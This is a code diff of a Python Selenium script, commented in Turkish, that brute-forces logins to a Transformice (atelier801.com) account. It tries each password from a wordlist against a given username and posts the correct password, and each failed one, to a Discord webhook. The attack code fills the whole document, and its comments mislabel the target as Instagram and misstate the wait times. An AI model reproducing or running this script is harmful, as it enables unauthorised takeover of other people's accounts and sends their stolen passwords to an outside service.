@@ -11,7 +11,7 @@ name = input("Transformice Adı: ")
 
 
 driver= webdriver.Chrome()
-driver.get("https://atelier801.com/login?redirect=https%3A%2F%2Fatelier801.com%2Findex") # Ateliler801 giriş sayfasına yönlendir.
+driver.get("https://atelier801.com/login?redirect=https%3A%2F%2Fatelier801.com%2Findex") # Instagram giriş sayfasına yönlendir.
 time.sleep(3)
 
 correctUrl = "https://atelier801.com/index"
@@ -20,21 +20,22 @@ password = driver.find_element(By.ID, 'auth_pass_1')
 giris = driver.find_element(By.XPATH, "/html/body/div[2]/div[5]/div[3]/div/form[1]/fieldset/div[4]/button")
 
 
-dosya = open("wordlist.txt", "r") # Şifrelerin kaydedildiği wordlist dosyamızı açtık. Python dosyası ile txt dosyamız aynı klasörde olmalı.
+dosya = open("wordlist.txt", "r") # Şifrelerin kaydedildiği wordlist dosyamızı açtık.
 
 for satir in dosya:
-    username.send_keys(name) 
-    password.send_keys(satir) 
-    giris.click() 
-    time.sleep(15)
-    if driver.current_url == correctUrl: # Şifreyi bulursa discorda Correct mesajı gönderecek
+    username.send_keys(name) # Instagram kullanıcı adı knk.
+    password.send_keys(satir) # WordList'teki şifreler. Tek tek denenecek.
+    giris.click() # Giriş yap butonuna tıklama komutu knk.
+    time.sleep(15) # Şifreler denendikten sonra 3 saniye bekle.
+    if driver.current_url == correctUrl:
         time.sleep(16)
         webhook = DiscordWebhook(url='WEBHOOK BURAYA', content= "[" + name + "]" + " CORRECT: {}".format(satir))
         response = webhook.execute()
     kapat = driver.find_element(By.XPATH, "/html/body/div[1]/form/div[3]/button")
+    time.sleep(5)
     kapat.click()
     time.sleep(5)
-    webhook = DiscordWebhook(url='WEBHOOK BURAYA', content= "[BASIL]" + " HATALI ŞİFRE: {}".format(satir))
+    webhook = DiscordWebhook(url='WEBHOOOK BURAYA', content= "[BASIL]" + " HATALI ŞİFRE: {}".format(satir))
     response = webhook.execute()
     username.clear() # Username değişkenini sıfırla.
     password.clear() # Password değişkenini sıfırla.
